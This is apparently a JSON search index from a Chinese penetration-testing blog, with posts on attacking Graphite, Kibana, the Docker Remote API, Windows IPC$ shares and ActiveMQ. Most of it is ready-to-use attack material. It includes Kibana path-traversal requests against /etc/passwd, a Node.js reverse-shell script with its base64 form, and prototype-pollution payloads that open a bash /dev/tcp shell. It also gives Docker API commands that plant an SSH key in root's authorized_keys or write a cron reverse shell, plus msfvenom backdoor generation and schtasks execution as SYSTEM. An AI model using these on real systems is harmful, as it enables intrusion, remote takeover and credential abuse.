\u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;!--第三列---\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;!--第二行---\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tbody\u0026gt; \u0026lt;tfoot bgcolor=\u0026#34;\u0026#34; align=\u0026#34;\u0026#34; \u0026gt; \u0026lt;!--可选---\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;!--第三行---\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;单元格内的文字\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tfoot\u0026gt; \u0026lt;/table\u0026gt;   表单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  \u0026lt;!--创建表单---\u0026gt; \u0026lt;form name=\u0026#34;form1\u0026#34; method=\u0026#34;GET/POST\u0026#34; action=\u0026#34;url\u0026#34; enctype=\u0026#34;Text/plain | multipart/form-data | application/x-www-form-urlencoded\u0026#34; target=\u0026#34;_self/_blank\u0026#34;\u0026gt; 控件: \u0026lt;input name=\u0026#34;控件名\u0026#34; type=\u0026#34;控件类型\u0026#34; \u0026gt; 文本框: \u0026lt;input name=\u0026#34;text1\u0026#34; type=\u0026#34;text\u0026#34; size=10 maxlength=200 value=\u0026#34;文本默认值\u0026#34; \u0026gt; 密码框: \u0026lt;input name=\u0026#34;password1\u0026#34; type=\u0026#34;password\u0026#34; size=10 maxlength=200 value=\u0026#34;文本默认值\u0026#34;\u0026gt; \u0026lt;br /\u0026gt; 单选按钮: \u0026lt;input name=\u0026#34;radio1\u0026#34; type=\u0026#34;radio\u0026#34; value=\u0026#34;单选按钮取值1\u0026#34; checked\u0026gt;选项1 单选按钮: \u0026lt;input name=\u0026#34;radio1\u0026#34; type=\u0026#34;radio\u0026#34; value=\u0026#34;单选按钮取值2\u0026#34; \u0026gt;选项2 \u0026lt;br /\u0026gt; 复选项: \u0026lt;input name=\u0026#34;checkbox1\u0026#34; type=\u0026#34;checkbox\u0026#34; value=\u0026#34;复选项的值\u0026#34; checked\u0026gt;项目1 复选项: \u0026lt;input name=\u0026#34;checkbox1\u0026#34; type=\u0026#34;checkbox\u0026#34; value=\u0026#34;复选项的值\u0026#34; \u0026gt;项目2 复选项: \u0026lt;input name=\u0026#34;checkbox1\u0026#34; type=\u0026#34;checkbox\u0026#34; value=\u0026#34;复选项的值\u0026#34; checked\u0026gt;项目3 \u0026lt;br /\u0026gt; 普通按钮: \u0026lt;input name=\u0026#34;button1\u0026#34; type=\u0026#34;button\u0026#34; value=\u0026#34;普通按钮显示值\u0026#34; onclick=\u0026#34;function\u0026#34;\u0026gt; \u0026lt;br /\u0026gt; 提交按钮: \u0026lt;input name=\u0026#34;submit1\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;提交按钮显示值\u0026#34; \u0026gt; 重置按钮: \u0026lt;input name=\u0026#34;reset1\u0026#34; type=\u0026#34;reset\u0026#34; value=\u0026#34;重置按钮显示值\u0026#34; \u0026gt; 图像提交按钮: \u0026lt;input name=\u0026#34;image1\u0026#34; type=\u0026#34;image\u0026#34; src=\u0026#34;path/to/image\u0026#34; value=\u0026#34;默认值\u0026#34; \u0026gt; 隐藏按钮: \u0026lt;input name=\u0026#34;hidden1\u0026#34; type=\u0026#34;hidden\u0026#34; value=\u0026#34;提交参数值\u0026#34;\u0026gt; 文件按钮: \u0026lt;input name=\u0026#34;file1\u0026#34; type=\u0026#34;file\u0026#34; \u0026gt; \u0026lt;!--菜单列表类型的控件---\u0026gt; \u0026lt;!--下拉菜单---\u0026gt; 证件类型: \u0026lt;select name=\u0026#34;cardtype\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;id_card\u0026#34; selected\u0026#34;\u0026gt;身份证 \u0026lt;option value=\u0026#34;stu_card\u0026#34; \u0026gt;学生证 \u0026lt;option value=\u0026#34;drive_card\u0026#34;\u0026gt;驾驶证 \u0026lt;option value=\u0026#34;other_card\u0026#34;\u0026gt;其他证件 \u0026lt;/select\u0026gt;\t\u0026lt;!--列表项菜单---\u0026gt; 对html评价: \u0026lt;select name=\u0026#34;content\u0026#34; size=5 multiple\u0026gt; \u0026lt;option value=\u0026#34;M1\u0026#34; selected\u0026gt;很容易 \u0026lt;option value=\u0026#34;M2\u0026#34; \u0026gt;一般 \u0026lt;option value=\u0026#34;M3\u0026#34; \u0026gt;能理解 \u0026lt;/select\u0026gt; \u0026lt;!--文本域----\u0026gt; 留言: \u0026lt;textarea name=\u0026#34;textarea1\u0026#34; rows=5 cols=80 \u0026gt;默认显示值\u0026lt;/textarea\u0026gt;\t\u0026lt;/form\u0026gt;   框架 框架基本结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  \u0026lt;!--水平分割窗口rows---\u0026gt; \u0026lt;frameset rows=\u0026#34;30%,70%\u0026#34; frameborder=0/1 \u0026gt; \u0026lt;frame src=\u0026#34;path/to/xx.html name=\u0026#34;xx\u0026#34; \u0026gt; \u0026lt;frame src=\u0026#34;path/to/file name=\u0026#34;file1\u0026#34; \u0026gt; \u0026lt;/frameset\u0026gt; \u0026lt;!--垂直分割窗口cols---\u0026gt; \u0026lt;frameset rows=\u0026#34;25%,55%，25%\u0026#34; frameborder=0/1 \u0026gt; \u0026lt;frame\u0026gt; \u0026lt;frame\u0026gt; \u0026lt;frame\u0026gt; \u0026lt;/frameset\u0026gt; ### 浮动框架 ```html \u0026lt;iframe name=\u0026#34;\u0026#34; align=\u0026#34;\u0026#34; width=12 height=12 src=\u0026#34;path/to/xx.html\u0026#34; \u0026gt; \u0026lt;iframe\u0026gt;   ","description":"","id":46,"section":"blog","tags":null,"title":"html_basic","uri":"http://crkmythical.github.io/blog/html-basic/"},{"content":"编写进度\n   Graphite 是一个企业级开源系统的实时监控绘图工具,采用Django框架编写，可实时收集、存储、显示时间序列类型的数据。\ninformation nmap -T4 -sV -Pn -p 5000 10.199.56.1 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-17 17:14 CST Nmap scan report for 10.199.56.1 Host is up (0.088s latency). PORT STATE SERVICE VERSION 5000/tcp open upnp? 1 service unrecognized despite returning data. MSF相关利用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  Module options (exploit/unix/webapp/graphite_pickle_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.199.56.1 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5000 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The path to a vulnerable application VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 12.12.3.190 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port   ","description":"","id":47,"section":"blog","tags":null,"title":"Graphite","uri":"http://crkmythical.github.io/blog/graphite/"},{"content":"编写进度\n   Kibana 是为 Elasticsearch设计的开源分析和可视化平台。用户可以使用 Kibana 来搜索、查看存储在 Elasticsearch 索引中的数据并与之交互，并且可以很容易实现高级的数据分析和可视化，以图标的形式展现出来。用户可以在大量数据之上创建条形图，折线图和散点图，或饼图和地图。\nKibana还提供了一个称为Canvas的演示工具，用户可以利用该工具来创建幻灯片平台，并且直接从Elasticsearch中获取实时数据。并且Elasticsearch，Logstash和Kibana的组合可以作为数据服务产品。Logstash向Elasticsearch提供输入流以进行存储和搜索，而Kibana则访问数据以进行可视化。\n信息收集 1 2 3 4 5 6 7 8 9 10  nmap -Pn -T4 -sSUV -p 5601 192.168.79.207 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-10 14:55 CST Nmap scan report for 192.168.79.207 Host is up (0.00017s latency). PORT STATE SERVICE VERSION 5601/tcp open http Elasticsearch Kibana 5.6.12 5601/udp closed esmagent Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds   漏洞利用 1 2 3 4 5  GET /api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis=../../../../../../../../../../../etc/passwd # 任意文件读取 GET /api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis=es_6.0 GET /api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis= ../../../cli_plugin/index #拒绝服务漏洞   拒绝服务漏洞 1 2 3  curl \u0026#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis= ../../../cli_plugin/index.js\u0026#39; curl \u0026#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis= ../../../cli_plugin/cli.js\u0026#39; curl \u0026#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis= ../../../docs/cli.js\u0026#39;   任意文件读取 CVE-2018-17246 1 2 3  curl \u0026#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis=../../../../../../../../../../../etc/passwd\u0026#39; {\u0026#34;statusCode\u0026#34;:500,\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;An internal server error occurred\u0026#34;}%   虽然响应码为500，但是服务器日志可以泄漏\n通常情况下Kibana与其他的应用程序一起部署，如果应用程序可以上传或者写入Javascript文件的话，攻击者可以通过Nodejs创建一个Reverse Shell:\n文件shell.js内容如下： 放到服务器中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  (function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;/bin/sh\u0026#34;, []); var client = new net.Socket(); client.connect(7777, \u0026#34;10.211.55.13\u0026#34;, function(){ //vps_ip:192.168.33.1 port:8080  client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })(); base64格式： ZnVuY3Rpb24oKXsKICAgIHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwKICAgICAgICBjcCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSwKICAgICAgICBzaCA9IGNwLnNwYXduKCIvYmluL3NoIiwgW10pOwogICAgdmFyIGNsaWVudCA9IG5ldyBuZXQuU29ja2V0KCk7CiAgICBjbGllbnQuY29ubmVjdCg3Nzc3LCAiMTAuMjExLjU1LjEzIiwgZnVuY3Rpb24oKXsgICAgLy92cHNfaXA6MTkyLjE2OC4zMy4xICBwb3J0OjgwODAKICAgICAgICBjbGllbnQucGlwZShzaC5zdGRpbik7CiAgICAgICAgc2guc3Rkb3V0LnBpcGUoY2xpZW50KTsKICAgICAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOwogICAgfSk7CiAgICByZXR1cm4gL2EvOyAvLyBQcmV2ZW50cyB0aGUgTm9kZS5qcyBhcHBsaWNhdGlvbiBmb3JtIGNyYXNoaW5nCn0pKCk7   1 2 3 4 5 6  echo \u0026#34;\u0026lt;shell.js base64 encoded string \u0026gt;\u0026#34; | base64 -d \u0026gt;\u0026gt;/tmp/shell.js nc -lvp 7777 # 本地监听7777端口 curl \u0026#39;http://192.168.79.207:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION\u0026amp;apis=../../../../../../../../../../../tmp/shell.js\u0026#39;   Kinana远程代码执行 存在漏洞版本：\nKibana 5.6.15之前版本和6.6.1之前版本中的Timelion visualizer存在安全漏洞\n该漏洞触发，需要Timelion 和 Canvas插件\n1  http://192.168.79.207:5601/app/kibana#/management?_g=() #查看Kibana版本   点在Timelion处,直接填入payload，点击run\n1 2 3 4 5  .es(*).props(label.__proto__.env.AAAA=\u0026#39;require(\u0026#34;child_process\u0026#34;).exec(\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/PORT 0\u0026gt;\u0026amp;1\u0026#34;);process.exit()//\u0026#39;) .props(label.__proto__.env.NODE_OPTIONS=\u0026#39;--require /proc/self/environ\u0026#39;) .es(*).props(label.__proto__.env.AAAA=\u0026#39;require(\u0026#34;child_process\u0026#34;).exec(\u0026#34;/bin/touch /tmp/success\u0026#34;);process.exit()//\u0026#39;) .props(label.__proto__.env.NODE_OPTIONS=\u0026#39;--require /proc/self/environ\u0026#39;)   成功后，再访问**“Canvas”**页面触发命令/bin/touch /tmp/success，\nKibana_RCE_CVE-2019-7609\n","description":"","id":48,"section":"blog","tags":null,"title":"Kibana","uri":"http://crkmythical.github.io/blog/kibana/"},{"content":"编写进度\n 信息收集 漏洞利用  Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。\nDocker Registry API未授权访问 更多用法参考Registry API\nNmap探测 1 2 3 4 5 6 7  nmap -Pn -T4 -sV -p 18093 10.200.88.6 130 ↵ Nmap scan report for 10.200.88.6 Host is up (0.067s latency). PORT STATE SERVICE VERSION 18093/tcp open http Docker Registry (API: 2.0)   利用 1 2 3 4 5 6  curl http://10.200.88.6:18093/v2/_catalog # 获取仓库列表 {\u0026#34;repositories\u0026#34;:[\u0026#34;ondp-web\u0026#34;]} curl http://10.200.88.6:18093/v2/ondp-web/tags/list # 获取指定仓库中镜像的tags列表 {\u0026#34;name\u0026#34;:\u0026#34;ondp-web\u0026#34;,\u0026#34;tags\u0026#34;:[\u0026#34;1.1.0-61752\u0026#34;]}   Docker Remote API未授权访问 Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。\n信息收集 端口信息 1 2 3 4 5 6 7 8  nmap -Pn -T4 -sV -p 2375 192.168.79.207 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:34 CST Host is up (0.28s latency). PORT STATE SERVICE VERSION 2375/tcp open docker Docker 19.03.13 Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds   docker版本、容器信息  通过curl命令查看  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  curl \u0026#39;http://192.168.79.207:2375/version\u0026#39; # 查看docker运行的版本信息  {\u0026#34;Platform\u0026#34;:{\u0026#34;Name\u0026#34;:\u0026#34;Docker Engine - Community\u0026#34;},\u0026#34;Components\u0026#34;:[{\u0026#34;Name\u0026#34;:\u0026#34;Engine\u0026#34;,\u0026#34;Version\u0026#34;:\u0026#34;19.03.13\u0026#34;,\u0026#34;Details\u0026#34;: ... {\u0026#34;GitCommit\u0026#34;:\u0026#34;fec3683\u0026#34;}}],\u0026#34;Version\u0026#34;:\u0026#34;19.03.13\u0026#34;,\u0026#34;ApiVersion\u0026#34;:\u0026#34;1.40\u0026#34;,\u0026#34;MinAPIVersion\u0026#34;:\u0026#34;1.12\u0026#34;,\u0026#34;GitCommit\u0026#34;:\u0026#34;4484c46d9d\u0026#34;,\u0026#34;GoVersion\u0026#34;:\u0026#34;go1.13.15\u0026#34;,\u0026#34;Os\u0026#34;:\u0026#34;linux\u0026#34;,\u0026#34;Arch\u0026#34;:\u0026#34;amd64\u0026#34;,\u0026#34;KernelVersion\u0026#34;:\u0026#34;4.15.0-29-generic\u0026#34;,\u0026#34;BuildTime\u0026#34;:\u0026#34;2020-09-16T17:01:06.000000000+00:00\u0026#34;} curl \u0026#39;http://192.168.79.207:2375/\u0026lt;容器id\u0026gt;/info\u0026#39; # 查看容器运行的信息  curl \u0026#39;http://192.168.79.207:2375/containers/json?all=1\u0026#39; # 获取全部容器列表 [{\u0026#34;Id\u0026#34;:\u0026#34;68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545\u0026#34;,\u0026#34;Names\u0026#34;:[\u0026#34;/reverent_bell\u0026#34;],\u0026#34;Image\u0026#34;:\u0026#34;ubuntu:18.04\u0026#34;,\u0026#34;ImageID\u0026#34;:\u0026#34;sha256:2c047404e52d7f17bdac4121a13cd844447b74e13063f8cb8f8b314467feed06\u0026#34;,\u0026#34;Command\u0026#34;:\u0026#34;sh -c \u0026#39;echo /dev/null\u0026#39;\u0026#34;,\u0026#34;Created\u0026#34;:1607475496,\u0026#34;Ports\u0026#34;:[],\u0026#34;Labels\u0026#34;:{},\u0026#34;State\u0026#34;:\u0026#34;running\u0026#34;,\u0026#34;Status\u0026#34;:\u0026#34;Up 4 hours\u0026#34;,\u0026#34;HostConfig\u0026#34;:{\u0026#34;NetworkMode\u0026#34;:\u0026#34;default\u0026#34;},\u0026#34;NetworkSettings\u0026#34;:{\u0026#34;Networks\u0026#34;:{\u0026#34;bridge\u0026#34;: ...{\u0026#34;IPAMConfig\u0026#34;:null,\u0026#34;Links\u0026#34;:null,\u0026#34;Aliases\u0026#34;:null,\u0026#34;NetworkID\u0026#34;:\u0026#34;5001dfbe94e8ad314a58ad790b10086d6accf0173bc1bfbc6d4e54d3e219ac24\u0026#34;,\u0026#34;EndpointID\u0026#34;:\u0026#34;3903fce3838f4002ca8f7142f77ffca4779d6293d4f84b5ca28d4f481c1d9177\u0026#34;,\u0026#34;Gateway\u0026#34;:\u0026#34;172.17.0.1\u0026#34;,\u0026#34;IPAddress\u0026#34;:\u0026#34;172.17.0.7\u0026#34;,\u0026#34;IPPrefixLen\u0026#34;:16,\u0026#34;IPv6Gateway\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;GlobalIPv6Address\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;GlobalIPv6PrefixLen\u0026#34;:0,\u0026#34;MacAddress\u0026#34;:\u0026#34;02:42:ac:11:00:07\u0026#34;,\u0026#34;DriverOpts\u0026#34;:null}}},\u0026#34;Mounts\u0026#34;:[]}] curl \u0026#39;http://192.168.79.207:2375/containers/68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545/json\u0026#39; # 查看具体容器的详细信息 curl \u0026#39;http://192.168.79.207:2375/containers/68ce933588680f6980e7922c721442a8a603995318b448b158c23fb90cfa5545/export\u0026#39; # 导出具体的镜像 curl \u0026#39;http://192.168.79.207:2375/images/json?all=1\u0026#39; # 获取全部镜像列表   更多用法参考Docker Remote API\n 通过docker -H查看  1 2 3 4 5 6 7 8  docker -H tcp://192.168.79.207 version #查看docker版本信息 docker -H tcp://192.168.79.207 images #查看目标机器的镜像 docker -H tcp://192.168.79.207 ps -a # 查看服务器运行的容器有哪些 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 8069f1b5cd72 5301ebcf503e \u0026#34;/bin/sh -c \u0026#39;curl --…\u0026#34; About a minute ago Created friendly_dhawan   漏洞利用 运行新镜像并提权  BurpSuite方式-不推荐  创建容器，返回容器id    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  POST /containers/create HTTP/1.1 Host: 192.168.79.207:2375 Content-Type: application/json cache-control: no-cache Postman-Token: 7abe8d48-2e9d-4245-a7a4-dbd66279705e { \u0026#34;Image\u0026#34;:\u0026#34;ubuntu:18.04\u0026#34;, \u0026#34;HostConfig\u0026#34;:{ \u0026#34;Binds\u0026#34;:[ \u0026#34;/root/:/tmp/:rw\u0026#34; ] }, \u0026#34;CMD\u0026#34;:[ \u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;echo \u0026#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC6kYan1DO/mcdvu8WcYvmXbEh4WzHqy9k0yeoN0AY40Gg2tnP9TTDMHUWwT5EZk4+hkL7UMr+CMhjnqucZKX5Yw/GhF3kwQZN/NCu3GtJ3/Abl6G6y3J4ej0Q85kFPnPyIM5ZRygTqq728HaHWDgqwjqSG35Dh7pjuvIV8ULuekYpeFN607bEZ0lM3vt3/Kf/fBZQseZYSoj4/S+hWTmVivDThBGECcbCEpVACX3LLSqMvYEURUlEbE+f9qpLV1y7rSIQNJu3VsitHy2m7TAxScxAYsu3MhJFWYQVUZOlUEatW0Q3Ch9iLvD/H5rnBe+ps6088sp/P0CgzrElPChZ root@kali\u0026#39; \u0026gt;\u0026gt; /tmp/.ssh/authorized_keys\u0026#34; ] }------WebKitFormBoundary7MA4YWxkTrZu0gW--    连接容器  1 2 3 4 5 6  POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/attach?stderr=1\u0026amp;stdin=1\u0026amp;stdout=1\u0026amp;stream=1 HTTP/1.1 Host: 172.26.1.97:2375 User-Agent: Docker-Client/1.7.0 (windows) Content-Length: 0 Content-Type: application/json Accept-Encoding: gzip    启动容器  1 2 3 4 5 6  POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/start HTTP/1.1 Host: 172.26.1.97:2375 User-Agent: Docker-Client/1.7.0 (windows) Content-Length: 0 Content-Type: application/json Accept-Encoding: gzip    命令行方式-推荐  1 2 3 4 5 6 7 8 9 10 11  docker -H 10.211.55.13:2375 run --rm -it --privileged --net host -v /:/mnt alpine docker -H tcp://10.200.30.64:2375 run -it -v /:/mnt platform_of_check /bin/bash docker -H tcp://192.168.79.207 run –rm –privileged -it -v /:/mnt busybox chroot /mnt --entrypoint sh # 以宿主root的身份启动busybox容器,并将宿主根目录/挂载到busybox容器的/mnt目录下，并切换busybox的根目录为/mnt目录，最后运行sh命令 参数解释： -rm 容器停止时自动删除该容器 --privileged 容器拥有宿主机的root权限 -it 开启tty终端 -v 挂载目录 格式为 宿主系统目录:容器目录. /:/mnt指将宿主系统根目录挂在到容器中的/mnt目录上 busybox 镜像名字 ,busybox体积小，同时命令齐全 chroot /mnt 将根目录切换到/mnt上 --entrypoint sh 执行sh    docker_api_vul  写入定时任务 1 2 3  docker -H tcp://192.168.79.207:2375 image # 查看宿主机可用镜像 docker -H tcp://192.168.79.207:2375 run -it -v /var/spool/cron/:/var/spool/cron/ \u0026lt;image_id\u0026gt; /bin/bash # 进入容器，并将宿主机/var/spool/cron/目录挂载到容器/var/spool/cron/目录下 root@bfd2539dfdc8:/# echo \u0026#39;* * * * * bash -i \u0026gt;\u0026amp; /dev/tcp/attack_ip/8088 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;\u0026gt; /var/spool/cron/root # 写入反弹shell命令到定时任务中   MSF相关模块 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  msf6 exploit(linux/http/docker_daemon_tcp) \u0026gt; options Module options (exploit/linux/http/docker_daemon_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- CONTAINER_ID no container id you would like DOCKERIMAGE alpine:latest yes hub.docker.com image to use Proxies socks4://127.0.0.1:7891 no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 2375 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections VHOST no HTTP server virtual host Payload options (linux/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.79.207 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port   漏洞修复 在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：\n 设置ACL，仅允许信任的来源IP连接； 修改docker swarm的认证方式，使用TLS认证  客户端与服务器端通讯的证书生成后，可以通过以下命令启动docker daemon：\n1  docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=tcp://x.x.x.x:2375 -H unix:///var/run/docker.sock   客户端连接时需要设置以下环境变量\n1 2 3 4  export DOCKER_TLS_VERIFY=1 export DOCKER_CERT_PATH=~/.docker export DOCKER_HOST=tcp://x.x.x.x:2375 export DOCKER_API_VERSION=1.12   ","description":"","id":49,"section":"blog","tags":null,"title":"Docker","uri":"http://crkmythical.github.io/blog/docker/"},{"content":"IPC$(Internet Process Connection)是共享\u0026quot;命名管道\u0026quot;的资源。 它是为了让进程间通信而开放的命名管道，\n通过提供可信任的用户名和口令，\n连接双方可以建立安全的通道并以此通道进行加密数据的交换，\n从而实现对远程计算机的访问。\n使用条件：\n 开放了139、445端口； 目标开启ipc$文件共享； 获取用户账号密码。  msfvenom生成后门 1  msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.79.207 LPORT=4444 -f exe \u0026gt; ./test.exe   与目标建立ipc$连接 1 2 3 4 5 6 7 8 9 10 11  #建立ipc连接 net use \\\\10.211.55.9\\ipc$ /u:adminstrator \u0026lt;password\u0026gt; #查看已建立的连接 net use #挂载目标c盘到本地，盘符为z net use z: \\\\10.211.55.9\\c$ #查看目标网路共享的资源 net view \\\\10.211.55.9   拷贝test.exe到目标网络 #拷贝本地文件到目标C:\\windows\\temp\\中 copy test.exe \\\\10.211.55.9\\c$\\windows\\temp\\ #下载目录C:\\windows\\temp\\hash.txt文件到本地 copy \\\\10.211.55.9\\c$\\windows\\temp\\aaa.txt 4.启用计划任务执行 使用schtasks.exe命令 #在目标上创建计划任务task_name1 schtasks /create /tn task_name1 /s 10.211.55.9 /u administrator /p \u0026lt;password\u0026gt; /tr c:\\windows\\temp\\test.exe /sc onstart /ru system #执行目标上的计划任务task_name1 schtasks /run /s 10.211.55.9 /u administrator /p \u0026lt;password\u0026gt; /tn task_name1 # 创建该时间之后的某个时刻自动执行任务，任务名 plugin_update schtasks /create /tn \u0026quot;plugin_update\u0026quot; /tr c:\\windows\\temp\\plugin_update.exe /sc once /st 16:32 /S 193.168.1.12 /RU System /u administrator /p \u0026quot;1qaz@WSX\u0026quot; #删除目标上的计划任务task_name1 schtasks /delete /s 10.211.55.9 /u administrator /p \u0026lt;password\u0026gt; /tn task_name1 /f 使用at命令 #查看目标上的时间 net time \\\\10.211.55.9 #设定目标上的定时执行的任务 at \\\\10.211.55.9 13:54 c:\\windows\\temp test.exe #删除目标上的定时任务 at \\\\10.211.55.9 at \\\\10.211.55.9 \u0026lt;id\u0026gt; /del ","description":"","id":50,"section":"blog","tags":null,"title":"IPC Basic Operation","uri":"http://crkmythical.github.io/blog/ipc-basic-operation/"},{"content":"[toc]\nActiveMQ是Apache使用纯Java语言编写的开源消息中间件,\nhttps://juejin.cn/post/6844903920209231886\n信息收集 ╭─ethan@ethan.local ~ ╰─➤ nmap 10.184.67.63 -sV -Pn -T4 -p 61616 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-04 17:00 CST Nmap scan report for 10.184.67.63 Host is up (0.047s latency). PORT STATE SERVICE VERSION 61616/tcp open apachemq ActiveMQ OpenWire transport 5.14.0 (Java 1.8.0_172; arch: amd64) Service Info: OS: Linux 3.10.0; CPE: cpe:/o:linux:linux_kernel:3.10.0 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds Apache ActiveMQ Information Leak-[CVE-2017-15709] Apache ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息,会返回应用名称，JVM，操作系统以及内核版本等信息。\ntelnet测试 telnet 10.184.67.53 61616 MSF相关漏洞模块 ","description":"","id":51,"section":"blog","tags":null,"title":"ActiveMQ","uri":"http://crkmythical.github.io/blog/activemq/"},{"content":"[toc]\n推荐博文：\n https://mp.weixin.qq.com/s/J4ghw2iWQTKoNynF3gIcPQ https://www.shangyang.me/2016/12/16/hexo-base-concept/ https://segmentfault.com/a/1190000021614307 https://juejin.cn/post/6844903805859921933  搭建过程 hexo 是一个快速、简洁且高效的博客框架。\nHexo安装 1 2 3 4 5  brew install git node # 安装git 和node npm config set registry https://registry.npm.taobao.org # 配置npm源 npm install -g hexo-cli # 安装hexo proxychains4 hexo init Mr-Framework # 初始化博客 git clone https://github.com/yelog/hexo-theme-3-hexo.git themes/3-hexo # 下载3-hexo主题   Hexo目录结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  Mr-Framework├── _config.yml\t// 网站配置文件├── node_modules\t// npm依赖模块目录├── package-lock.json\t// node项目配置文件├── package.json\t// node项目配置文件├── scaffolds\t// 新建mardown文件模板目录│ ├── draft.md\t│ ├── page.md\t│ └── post.md\t├── source\t// 存放makrdown文件和图片│ └── _posts│ └── hello-world.md //hexo默认markdown文件└── themes\t//hexo主题目录└── 3-hexo├── LICENSE├── README.md├── _config.yml\t//主题配置文件├── languages\t//语言支持插件│ ├── en.yml│ └── zh-CN.yml├── layout\t//布局文件│ ├── _partial│ ├── index.ejs│ ├── indexs.md│ └── post.ejs└── source\t//主题源代码├── css├── img└── js  Hexo配置文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 